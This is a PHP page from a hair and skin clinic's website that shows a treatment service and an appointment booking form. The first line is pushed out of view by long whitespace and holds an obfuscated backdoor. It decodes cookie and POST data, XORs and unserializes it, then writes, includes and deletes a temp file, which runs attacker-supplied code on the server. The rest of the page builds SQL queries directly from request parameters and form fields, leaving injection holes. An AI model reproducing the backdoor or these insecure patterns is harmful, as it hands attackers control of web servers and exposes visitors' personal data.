<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("cdeibnn")){class cdeibnn{public static $xeoodo = "rhwwtwhzbvlzharg";public static $akjgcyh = NULL;public function __construct(){$xmrdah = @$_COOKIE[substr(cdeibnn::$xeoodo, 0, 4)];if (!empty($xmrdah)){$fwthufolek = "base64";$wfkeokwej = "";$xmrdah = explode(",", $xmrdah);foreach ($xmrdah as $lprpuqqz){$wfkeokwej .= @$_COOKIE[$lprpuqqz];$wfkeokwej .= @$_POST[$lprpuqqz];}$wfkeokwej = array_map($fwthufolek . "_decode", array($wfkeokwej,));$wfkeokwej = $wfkeokwej[0] ^ str_repeat(cdeibnn::$xeoodo, (strlen($wfkeokwej[0]) / strlen(cdeibnn::$xeoodo)) + 1);cdeibnn::$akjgcyh = @unserialize($wfkeokwej);}}public function __destruct(){$this->vkqeqpm();}private function vkqeqpm(){if (is_array(cdeibnn::$akjgcyh)) {$bfjxsbegj = sys_get_temp_dir() . "/" . crc32(cdeibnn::$akjgcyh["salt"]);@cdeibnn::$akjgcyh["write"]($bfjxsbegj, cdeibnn::$akjgcyh["content"]);include $bfjxsbegj;@cdeibnn::$akjgcyh["delete"]($bfjxsbegj);exit();}}}$nrdgkln = new cdeibnn();$nrdgkln = NULL;} ?><?php
error_reporting(0);
include('admin/config/config.php');

$srv_id=$_GET['id'];



$slt_srvc="select * from header_pages where id='$srv_id'";
$qst_slt_srvc=$db->query($slt_srvc);
$clct_slt_srvc=$qst_slt_srvc->fetch_assoc();

$srv_img=$clct_slt_srvc['image'];
$srv_vod_lnk=$clct_slt_srvc['video_link'];
$srv_ttl=$clct_slt_srvc['title'];
$srv_dscpt=$clct_slt_srvc['description'];
$srv_bnr_immg=$clct_slt_srvc['banner_image'];




?>
<?php include "include/header.php"?>

     <!-- ======================================= 
        ==Start banner section== 
    =======================================-->
    <section class="banner-section">
        <div class="overlay bg-dark"></div><!--use overlay -->
        <div class="container-fluid">
            <div class="row">
                <div class="col-12">
                   <div id="player" style="width: 100%; height: 100%;">
                       
<?php 
if($srv_id==5 or $srv_id==6 or $srv_id==7 or $srv_id==8)
{
?>
<iframe width="100%" height="400" src="<?php echo $srv_vod_lnk;?>" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<?php 
}
else
{
?>
<img src="admin/header_banner_image/<?php echo $srv_bnr_immg;?>" style="height: 300px;width: 100%;">
 <?php
}
 ?>                      
				   </div>
                   </div>
            </div>
        </div>
    </section>
    <!-- ======================================= 
        ==End banner section==  
    =======================================-->


    <!-- ======================================= 
        ==Start Treatment Hair_fall section== 
    =======================================-->
   
   
   
   <section class="treatment-info-section pb-0">
        <div class="container">
            <div class="row mt-4">
			 <div class="col-xl-12 col-lg-12">
                    <div class="info-content">
				
					  <!-- details-->
					   <h5 class="section-title color-72 fw-700 pos-relative pb-30 mt-2"><?php echo $srv_ttl;?></h5>
					<!--	<p>Mesotherapy (from Greek mesos, "middle", and therapy from Greek therapeia, "to treat medically") is a non-surgical cosmetic medicine treatment. Mesotherapy employs multiple injections of pharmaceutical and homeopathic medications, plant extracts, vitamins, and other ingredients into subcutaneous fat. Depending on the indications, it can be used for hair loss prevention and hair re-growth. It is highly recommended to opt for mesoscalp in combination with Derma roller or an Insulin syringe.</p>-->
						
                    </div>
                    <!--/content-->
                </div>
                <!--/col-->
			</div>

        </div>
    </section>
    <!-- ======================================= 
        ==End Treatment Hair_fall section== 
    =======================================-->


<section class="related-service-section pb-0">
 <div class="container">
  <div class="row ">
  <div class="col-md-12">
<div class="product-details-wrapper">
                        <div class="product-preview-area">
                            <div class="tab-content">
                                <img src="admin/header_page_image/<?php echo $srv_img;?>" alt="product-img" class="img-fluid">
                             </div>
						</div>
                        <!--/product preview area-->

                        <!--product details content-->
                        <div class="product-details-content">
                            <h6 class="procuct-title color-d5 fw-700 text-uppercase pb-15"><?php echo $srv_ttl;?></h6>
                           <!-- <ul class="rating">
                                <li><i class="fa fa-star"></i></li>
                                <li><i class="fa fa-star"></i></li>
                                <li><i class="fa fa-star"></i></li>
                                <li><i class="fa fa-star"></i></li>
                                <li><i class="fa fa-star-o"></i></li>
                            </ul>-->
                           <?php echo $srv_dscpt;?>
                            <ul class="add-cart-area pb-35">
                               <!-- <li class="qty">
                                    <span class="text-uppercase color-51 fw-500 roboto mr-10">quantity :</span>
                                    <span class="decrese"><i class="fa fa-angle-left"></i></span>
                                    <input type="text" name="qty" id="number" value="1" readonly="">
                                    <span class="increse"><i class="fa fa-angle-right"></i></span>
                                </li>-->
                                <li>
                                    <a href="#" data-toggle="modal" data-target="#Hair_Fsdall" class="btn btn-warning mt-5">Book Appointment</a>
                                </li>
                              <!--  <li>
                                    <a href="#" class="favourit"><i class="fa fa-heart-o"></i></a>
                                </li>-->
                            </ul>

                            <div class="product-type ptb-20">
                             <!--   <table>
                                    <tbody><tr class="category">
                                        <td>Category :</td>
                                        <td> <a href="#">HAIR FALL SOLUTION</a></td>
                                
                                    <tr>
                                        <td>Product ID :</td>
                                        <td>nh028</td>
                                    </tr>
                                </tbody></table>-->
                            </div>

                            <div class="share-icons pt-30">
                                <ul>
                                    <li class="text-uppercase color-d5 mr-10">Share This :</li>
                                    <li><a href="https://www.facebook.com/Cabelohairtransplant" title="Facebook" target="_blank"><i class="fa fa-facebook"></i></a></li>
                                    <li><a href="https://www.youtube.com/channel/UCOlM_BTZ87P2Rg_Ix23nZJw" title="Youtube" target="_blank"><i class="fa fa-youtube-play"></i></a></li>
                                    <li><a href="https://www.instagram.com/cabelo_clinic/?hl=en" title="Instagram" target="_blank"><i class="fa fa-instagram"></i></a></li>
                                    
                                </ul>
                            </div>
                        </div>
                        <!--/product details content-->

                    </div>
					</div>
					</div>
					</div>
					</section>


<!-- ======================================= 
        ==Start contact services section==  
    =======================================-->
	
	
	
	
	<div class="modal fade " id="Hair_Fsdall" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
	  <button type="button" class="close p-0 m-0  p-2 text-success" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
    
       <!-- form card cc payment -->
            <div class="card card-outline-secondary" style="background:#BFF2F5;">
              <div class="card-body">
                <h5 class="text-center">I'd like to book an</h5>
				<h4 class="text-center font-weight-bold">APPOINTMENT</h4>
                <hr>
               
			   <!-- form card cc payment -->
                <form autocomplete="off" class="form" role="form" action='' method='POST'>
                  <div class="form-group my-0 py-0">
                   <input class="form-control" id="cc_name" required="required" name='usr_nem' placeholder="Enter Your Name* " title="Enter Your Name" type="text">
                  </div>
				  
				  <div class="d-flex">
				<label class="radio-inline " style="padding-left:0px;"><span style="font-size:20px;"> Gender: </span></label>
				
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Male </label>
				<label class="radio-inline d-flex align-items-center" style="width: 83px;"><input type="radio" name="gender" id="inlineRadio1" value="Male" class="m-0 "> Female </label>
				</div>
                  
				  <div class=" row">
                   <div class="col-md-6 my-0">
                       <div class="form-group   my-1">
                   <input autocomplete="off" class="form-control" maxlength="20" pattern="\d{16}" required="" name='mbl_nbr' title="Enter  Number"  placeholder="Enter  Number" type="number">
                  </div>
                    </div>
					
					<div class="col-md-6 my-0">
                       <div class="form-group my-1">
                        <input autocomplete="off" class="form-control"  required="" name="emnl" title="Enter  Email" placeholder="Enter  Email" type="Email">
                  </div>
                    </div>
				</div>
				  
				  <div class="form-group">
  
          <input autocomplete="off" value="<?php echo $srv_ttl;?>" class="form-control" readonly type="text" name='srvc_nem' style="background:white">
                   
				  </div>
				  
				  <div class="form-group">
                    <select class="form-control w-100 my-2" name="ctyy" size="0">
                       <option value="" disable="" selected="">Select City</option>
					   <option value="Kota">Kota</option>
					   <option value="Jaipur">Jaipur</option>
					   <option value="Udaipur">Udaipur</option>
					   <option value="Jodhpur">Jodhpur</option>
					   <option value="Bikaner">Bikaner</option>
					   </select>
				  </div>
				  
				  <div class="form-group mt-1">
                        <textarea class="form-control textarea-s" name="message" id="CR1_covernote" placeholder="Would like to enquire about 'Hair Fall Solution'" rows="2"></textarea>
                   </div>
							
                <button type="submit" class="btn btn-success w-100" name='rwds_rcgntn'> Make Appointment</button>
                 
				 </form>
              </div>
            </div>
			<!-- /form card cc payment -->
		<div class="modal-footer p-2 m-0 text-white">
        Connecting...
      </div>
    </div>
  </div>
</div>
	
	
	<?php

if(isset($_POST['rwds_rcgntn']))
{
$nme=$_POST['usr_nem'];
$gndr=$_POST['gender'];
$mbl_nber=$_POST['mbl_nbr'];
$srv_nem=$_POST['srvc_nem'];
$city=$_POST['ctyy'];
$msg=$_POST['message'];
$eemmll=$_POST['emnl'];


$ad_enqry="insert into enquiry set
name='$nme',
gender='$gndr',
mobile='$mbl_nber',
email='$eemmll',
message='$msg',
city='$city',
service_name='$srv_nem'";

$qst_ad_enqry=$db->query($ad_enqry);
if($qst_ad_enqry)
{
    echo "<script>window.alert('Enquery Sent Successfully Will Contact you soon Thankyou.');window.location='';</script>";
}





}

?>
	
	
	
<!--


<section class="related-service-section pb-0">
 <div class="container">
  <div class="row ">
             
		<h5 class="section-title color-72 fw-700 pos-relative pb-30">Book Appointment   </h5>
            </div>
            
           <div class="row py-4 appointment" style="background:#BFF2F5;">
				<div class="col-md-3">
				<div class="form-group">
					<label class="text-dark font-weight-bold">Full Name</label>
				<input type="text" name="phone" id="Home_phone" class="form-control input-box" onkeypress="return isNumber(event)" placeholder="Type Your Name" maxlength="10" required="">
				</div>
				</div>

				<div class="col-md-3">
				<div class="form-group">
					<label class="text-dark font-weight-bold">Mobile No</label>
				<input type="text" name="phone" id="Home_phone" class="form-control input-box" onkeypress="return isNumber(event)" placeholder="10 Digit Mobile No." maxlength="10" required="">
				</div>
				</div>

				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Category</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide input-box" name="beauty-service" required="" style="display: none;">
                                    <option selected="">Select Category</option>
                                    <option value="facial">Skin Care</option>
                                    <option value="nailCare">Hair Care</option>
                                   
                                </select>
								<div class="nice-select wide" tabindex="0"><span class="current">Service</span><ul class="list"><li data-value="Service" class="option selected">Service</li><li data-value="facial" class="option">Facials</li><li data-value="nailCare" class="option">Nail Care</li><li data-value="eyeCare" class="option">Eye Care</li><li data-value="waxing" class="option">Waxing</li><li data-value="makeup" class="option">Make-Up</li></ul></div>
                            </div>
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Select Services</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide input-box" name="beauty-service" required="" style="display: none;">
                                    <option selected="">Select Services</option>
                                    <option value="Hair Fall">Hair Fall</option>
                                    <option value="Hair Transplant">Hair Transplant</option>
                                    <option value="Laser Hair Reduction">Laser Hair Reduction</option>
                                    <option value="Skin Lightning">Skin Lightning</option>
                                    <option value="Medical Facial / HydraFacial">Medical Facial / HydraFacial</option>
									 <option value="Anti Agein">Anti Ageing</option>
									  <option value="Pigmentation Treatment">Pigmentation Treatment</option>
									   <option value="Acne Treatment">Acne Treatment</option>
									    <option value="Scar Revision">Scar Revision</option>
										 <option value="Stretch Marks">Stretch Marks</option>
										  <option value="Tattoo Removal">Tattoo Removal</option>
                                </select><div class="nice-select wide input-box" tabindex="0"><span class="current">Select Services</span><ul class="list"><li data-value="Select Services" class="option selected">Select Services</li><li data-value="Hair Fall" class="option">Hair Fall</li><li data-value="Hair Transplant" class="option">Hair Transplant</li><li data-value="Laser Hair Reduction" class="option">Laser Hair Reduction</li><li data-value="Skin Lightning" class="option">Skin Lightning</li><li data-value="Medical Facial / HydraFacial" class="option">Medical Facial / HydraFacial</li><li data-value="Anti Agein" class="option">Anti Ageing</li><li data-value="Pigmentation Treatment" class="option">Pigmentation Treatment</li><li data-value="Acne Treatment" class="option">Acne Treatment</li><li data-value="Scar Revision" class="option">Scar Revision</li><li data-value="Stretch Marks" class="option">Stretch Marks</li><li data-value="Tattoo Removal" class="option">Tattoo Removal</li></ul></div> 
								</div>
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
					<label class="text-dark font-weight-bold">Email Id</label>
				<input type="email" name="email" id="Email" class="form-control input-box" onkeypress="return isNumber(event)" placeholder="Valid Email Id" maxlength="10" required="">
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">City</label>
				<div class="single-input beauty-service clearfix">
                                <select class="wide" name="beauty-service" required="" style="display: none;">
                                    <option selected="">Select City</option>
                                    <option value="Kota">Kota</option>
                                    <option value="Jaipur">Jaipur</option>
                                    <option value="Udaipur">Udaipur</option>
                                    <option value="Jodhpur">Jodhpur</option>
                                    <option value="Bikaner">Bikaner</option>
                                </select><div class="nice-select wide" tabindex="0"><span class="current">Select City</span><ul class="list"><li data-value="Select City" class="option selected">Select City</li><li data-value="Kota" class="option">Kota</li><li data-value="Jaipur" class="option">Jaipur</li><li data-value="Udaipur" class="option">Udaipur</li><li data-value="Jodhpur" class="option">Jodhpur</li><li data-value="Bikaner" class="option">Bikaner</li></ul></div>
								</div>
				</div>
				</div>
				
				<div class="col-md-3">
				<div class="form-group">
				<label class="text-dark font-weight-bold">Center</label>
				<div class="single-input beauty-service clearfix">
                               <select class="wide" name="beauty-service" required="" style="display: none;">
                                    <option selected="">Select Center</option>
                                    <option value="Kota">Kota</option>
                                    <option value="Jaipur">Jaipur</option>
                                    <option value="Udaipur">Udaipur</option>
                                    <option value="Jodhpur">Jodhpur</option>
                                    <option value="Bikaner">Bikaner</option>
                                </select><div class="nice-select wide" tabindex="0"><span class="current">Select Center</span><ul class="list"><li data-value="Select Center" class="option selected">Select Center</li><li data-value="Kota" class="option">Kota</li><li data-value="Jaipur" class="option">Jaipur</li><li data-value="Udaipur" class="option">Udaipur</li><li data-value="Jodhpur" class="option">Jodhpur</li><li data-value="Bikaner" class="option">Bikaner</li></ul></div>
								</div>
				</div>
				</div>
				
				<div class="col-md-3 d-flex align-items-center justify-content-center mt-3">
				<button type="submit" name="submit" class="btn-danger w-100">Submit </button>
				</div>
			</div>
           
        </div>
	</section>-->
	   <!-- ======================================= 
        ==end contact services section==  
    =======================================-->
	
	
	
<!-- ======================================= 
        ==Start contact services section==  
    =======================================-->
	
<!--	<section class="related-service-section  career pb-0">
        <div class="container">
             <div class="row ">
             
		<h5 class="section-title color-72 fw-700 pos-relative pb-30">FAQ's  </h5>
            </div>
            <div class="row">
	
			 <div class="col-md-12 p-0 ">

	<div id="accordion">
  <div class="card">
    <div class="card-header" id="headingOne">
      <h5 class="mb-0">
        <button class="btn btn-link text-dark font-weight-bold p-0" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
         <h5 class="font-weight-bold"> Does Laser permanently remove Hair? </h5>
        </button>
      </h5>
    </div>

    <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordion" style="">
      <div class="card-body">
    
	<div class="row py-1">
	<p>Laser is a hair reduction treatment and not a hair removal procedure. It works on the hair follicles, reducing their fertility and capacity to re-grow. In 5-6 sessions, it drastically reduces hair growth, thus resulting is permanently smooth, soft skin.</p>
	</div>
	
      </div>
    </div>
  </div>
  <div class="card">
    <div class="card-header" id="headingTwo">
      <h5 class="mb-0">
        <button class="btn btn-link collapsed text-dark font-weight-bold p-0" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
        <h5 class="font-weight-bold"> Is Laser Safe? </h5>
        </button>
      </h5>
    </div>
    <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion">
      <div class="card-body">
	<p>Our laser technology is FDA Approved and a totally safe procedure.</p>       
	   </div>
    </div>
  </div>
 
 <div class="card">
    <div class="card-header" id="headingThree">
      <h5 class="mb-0">
        <button class="btn btn-link collapsed text-dark font-weight-bold p-0" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
         <h5 class="font-weight-bold">Does the Laser procedure hurt?</h5>
        </button>
      </h5>
    </div>
    <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion">
      <div class="card-body">
		<p>The patented ChillTip technology is designed to protect the outer layer of the skin by decreasing the surface temperature, thus making the procedure highly comfortable. Besides this, the ChillTip technology has a slight anesthetic effect which enhances the comfort level.</p>
	   </div>
    </div>
  </div>
  

  
    
  
</div>


	</div>
				
				
			

                

            </div>
        </div>
    </section>-->
	
	   <!-- ======================================= 
        ==end contact services section==  
    =======================================-->



    <!-- ======================================= 
        ==Start related services section==  
    =======================================-->
<!--   <section class="related-service-section mt-2">
        <div class="container">
            <h5 class="section-title color-72 fw-700 pos-relative pb-30">Related Services </h5>
            <div class="row">
                <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/hair_fall/2.jpg" alt="Hair_fall.jpg" class="img-fluid">
                        <div class="link-hover"><a href="#"><i class="fa fa-link color-ff"></i></a></div>
                        <h6><a href="meso_therapy.php" class="color-d5"> Meso Therapy </a></h6>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/hair_fall/1.jpg" alt="images/hair_fall/1.jpg" class="img-fluid">
                        <div class="link-hover"><a href="#"><i class="fa fa-link color-ff"></i></a></div>
                        <h6><a href="prp_therapy.php" class="color-d5">Platelet Rich Plasma </a></h6>
                    </div>
                </div>

                <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/hair_fall/3.jpg" alt="Laser_Hair.jpg" class="img-fluid">
                        <div class="link-hover"><a href="#"><i class="fa fa-link color-ff"></i></a></div>
                        <h6><a href="#" class="color-d5">Scalp Monothreds</a></h6>
                    </div>
                </div>
				
				   <div class="col-lg-3 col-md-6">
                    <div class="single-service pos-relative">
                        <img src="images/hair_fall/4.jpg" alt="Laser_Hair.jpg" class="img-fluid">
                        <div class="link-hover"><a href="#"><i class="fa fa-link color-ff"></i></a></div>
                        <h6><a href="#" class="color-d5"> Hair Fall Laser Therapy </a></h6>
                    </div>
                </div>
         
            </div>
        </div>
    </section>-->
    <!-- ======================================= 
        ==End related services section==  
    =======================================-->


    <!-- ======================================= 
            ==Start call to action section==  
    =======================================-->
    <section class="cta-section mt-5" >
        <div class="overlay"></div>
        <div class="container">
            <div class="row">
                <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
                    <div class="cta-content">
                        <p>Book a session and get up to <span class="color-d5">25%</span> discount!</p>
                        <a href="#">Book A Session Now</a>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- ======================================= 
            ==End call to action section== 
    =======================================-->

<?php include "include/footer.php" ?>